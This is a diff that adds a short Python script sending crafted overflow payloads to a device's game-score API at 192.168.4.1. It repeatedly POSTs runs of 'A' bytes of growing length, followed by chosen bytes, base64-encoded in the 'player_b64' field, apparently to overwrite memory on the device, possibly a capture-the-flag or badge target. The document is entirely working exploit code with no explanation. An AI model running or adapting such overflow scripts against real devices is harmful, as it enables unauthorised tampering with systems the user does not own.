@@ -1,0 +1,16 @@
+import base64
+import requests
+
+
+for i in range(28, 60):
+    payload = b"A" * i + bytes([0x22, 0x3F, 0x00, 0x42])
+
+    print(
+        requests.post(
+            "http://192.168.4.1/api/v1/tetrisresult",
+            json={
+                "player_b64": base64.b64encode(payload).decode(),
+                "points": 10,
+            },
+        ).content
+    )
